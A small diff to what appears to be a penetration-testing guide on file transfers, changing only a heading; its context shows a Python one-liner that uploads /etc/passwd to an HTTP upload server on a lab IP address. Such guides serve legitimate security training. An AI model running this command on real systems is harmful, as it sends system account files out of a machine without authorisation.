@@ -117,7 +117,7 @@ File upload available at /upload
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
-#### Uploading a File Using a Python One-liner
+#### Uploading a File Using a Python Oneliner
 
 ```bash
 python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
